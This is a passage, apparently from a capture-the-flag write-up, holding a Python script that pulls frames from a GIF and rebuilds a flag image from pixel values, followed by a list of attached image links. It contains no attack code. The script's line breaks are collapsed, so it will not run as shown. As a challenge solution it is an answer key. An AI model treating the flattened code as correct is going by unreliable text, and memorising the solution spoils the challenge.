def get_nodes(): file_path = "./img/gif.gif" img = Image.open(file_path) iter = ImageSequence.Iterator(img) index = 0 for frame in iter: frame.save('./img/res/{0}.png'.format(index)) index += 1 print("done")
# get_nodes()new_img = Image.new('RGB',(340,340))def get_colors(): for i in range(1,1089): img = Image.open('./img/res/{0}.png'.format(i)) pixel = img.getpixel((1,1)) x = pixel[0] y = pixel[1] m = pixel[2] x = int(x) y = int(y) for i in range(x*10,x*10+10): for j in range(y*10,y*10+10): if m == 0: new_img.putpixel((i,j),(0,0,0)) else: new_img.putpixel((i,j),(255,255,255)) #print(i,pixel)get_colors()new_img.save('./img/flag.png')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/8-1683041177.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1683041178.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1683041179.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/9-1683041179.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/10-1683041181.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/7-1683041182.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/9-1683041182.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/5-1683041183.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1683041183.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/4-1683041184.png)